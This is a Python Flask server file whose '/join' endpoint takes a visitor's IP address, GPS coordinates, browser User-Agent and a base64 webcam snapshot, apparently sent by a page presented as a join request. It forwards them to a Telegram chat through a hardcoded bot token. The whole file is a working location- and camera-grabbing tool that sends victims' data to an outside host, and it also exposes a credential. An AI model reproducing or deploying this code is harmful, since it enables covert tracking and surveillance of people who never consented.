from flask import Flask, request, render_template, jsonify
import os
import requests
import base64
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = "7392197886:AAGHPXeG2AICKQbvZvTASlTG_zy2ytW1X6k"
TELEGRAM_CHAT_ID = "1595256793"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/join", methods=["POST"])
def join():
    try:
        data = request.json
        ip = data.get("ip")
        coords = data.get("coords")
        snapshot = data.get("snapshot")
        ua = request.headers.get("User-Agent")

        text = (
            f"New Join Request:\n"
            f"IP: {ip}\n"
            f"Coords: {coords}\n"
            f"UA: {ua}\n"
            f"Time: {datetime.utcnow()}"
        )
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": text}
        )

        if snapshot:
            img_data = base64.b64decode(snapshot.split(",")[1])
            files = {"photo": ("snapshot.png", img_data)}
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                data={"chat_id": TELEGRAM_CHAT_ID}, 
                files=files
            )

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

if __name__ == "__main__":
    app.run()
